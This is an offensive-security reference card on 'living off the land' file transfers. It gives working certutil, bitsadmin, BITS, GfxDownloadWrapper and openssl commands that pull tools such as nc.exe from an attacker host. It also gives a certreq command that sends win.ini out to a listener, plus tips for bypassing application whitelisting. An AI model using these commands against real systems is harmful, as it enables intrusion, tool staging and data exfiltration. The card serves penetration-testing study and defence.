---
tool: Living off the land (LOLBAS / GTFOBins)
slug: lolbins
kind: technique
stages: [delivery]
category: Transfers with trusted built-in binaries
platforms: [windows, linux]
services: [http, https, smb]
ports: [80, 443, 445]
tags: [lolbins, lolbas, gtfobins, certutil, bitsadmin, living-off-the-land, evasion]
attack: [T1105, T1218]
summary: Using signed, already-installed binaries to pull or push files, so nothing new lands on disk and application whitelisting is less likely to block you. The LOLBAS (Windows) and GTFOBins (Linux) projects catalogue them.
references:
  - LOLBAS project | https://lolbas-project.github.io/
  - GTFOBins | https://gtfobins.github.io/
---

## The idea

A "LOLBIN" is a trusted binary abused beyond its purpose: download, upload, execute, read or write files. Search LOLBAS for `/download` or `/upload`, and GTFOBins for `+file download` / `+file upload`, to find one that already exists in the environment.

## Windows download

```cmd
:: certutil (a defacto wget for Windows; AMSI flags this usage)
certutil.exe -urlcache -split -f http://10.10.14.5:8000/nc.exe nc.exe
:: bitsadmin
bitsadmin /transfer job /priority foreground http://10.10.14.5:8000/nc.exe C:\Temp\nc.exe
```

```powershell
# BITS via PowerShell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.14.5:8000/nc.exe" -Destination "C:\Temp\nc.exe"
# A misplaced-trust binary that application whitelisting may allow
GfxDownloadWrapper.exe "http://10.10.14.5/tool.exe" "C:\Temp\tool.exe"
```

## Windows upload

```cmd
:: certreq posts a file to your listener (nc -lvnp 8000 to catch it)
certreq.exe -Post -config http://10.10.14.5:8000/ c:\windows\win.ini
```

## Linux (GTFOBins), openssl as an nc-style transfer

```bash
# On your box: serve a file over TLS
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365
openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem < tool
# On the target: receive it
openssl s_client -connect 10.10.14.5:443 -quiet > tool
```

## Notes

`certutil` and `certutil`-style downloads are widely detected now (AMSI, user-agent `Microsoft-CryptoAPI`), so treat LOLBINs as whitelisting-bypass, not stealth. Check LOLBAS and GTFOBins for a binary that is already in the target's image before you drop your own. GTFOBins covers roughly 40 common binaries for transfer.
